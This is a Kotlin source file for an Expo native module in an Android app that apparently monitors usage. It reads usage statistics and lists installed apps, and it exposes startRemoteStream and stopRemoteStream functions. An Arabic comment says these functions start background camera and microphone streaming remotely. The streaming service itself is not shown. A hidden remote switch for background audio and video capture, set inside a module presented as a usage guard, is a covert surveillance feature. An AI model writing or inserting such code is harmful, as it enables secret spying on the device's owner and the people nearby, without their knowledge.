package com.rabahdj.app.guard

import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.Process
import android.provider.Settings
import java.util.Calendar
import expo.modules.kotlin.modules.Module
import expo.modules.kotlin.modules.ModuleDefinition

class GuardModule : Module() {
  private fun hasAccess(context: Context): Boolean {
    val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
    val mode = appOps.checkOpNoThrow(
      AppOpsManager.OPSTR_GET_USAGE_STATS,
      Process.myUid(),
      context.packageName
    )
    return mode == AppOpsManager.MODE_ALLOWED
  }

  override fun definition() = ModuleDefinition {
    Name("GuardModule")

    Function("hasUsageAccess") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      hasAccess(context)
    }

    Function("openUsageSettings") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
      }
      context.startActivity(intent)
    }

    // دالة بدء بث الكاميرا والميكروفون في الخلفية عن بُعد
    Function("startRemoteStream") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      val intent = Intent(context, MediaStreamingService::class.java).apply {
        action = "START_STREAM"
      }
      context.startService(intent)
      return@Function "Streaming Started"
    }

    // دالة إيقاف البث عن بُعد
    Function("stopRemoteStream") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      val intent = Intent(context, MediaStreamingService::class.java)
      context.stopService(intent)
      return@Function "Streaming Stopped"
    }

    AsyncFunction("getInstalledApps") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      val pm = context.packageManager
      pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
        .filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
        .map { it.packageName }
        .sorted()
    }

    AsyncFunction("getTodayUsage") {
      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
      if (!hasAccess(context)) {
        throw IllegalStateException("Usage access is not enabled")
      }

      val calendar = Calendar.getInstance()
      calendar.set(Calendar.HOUR_OF_DAY, 0)
      calendar.set(Calendar.MINUTE, 0)
      calendar.set(Calendar.SECOND, 0)
      calendar.set(Calendar.MILLISECOND, 0)

      val manager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
      val stats = manager.queryUsageStats(
        UsageStatsManager.INTERVAL_DAILY,
        calendar.timeInMillis,
        System.currentTimeMillis()
      )

      if (stats.isNullOrEmpty()) {
        return@AsyncFunction emptyList<Map<String, Any>>()
      }

      stats.filter { it.totalTimeInForeground > 0L }
        .groupBy { it.packageName }
        .map { (packageName, entries) ->
          val totalMs = entries.map { it.totalTimeInForeground }.sum()
          mapOf(
            "packageName" to packageName,
            "minutes" to (totalMs / 60000L).toInt()
          )
        }
        .sortedByDescending { it["minutes"] as Int }
    }
  }
}
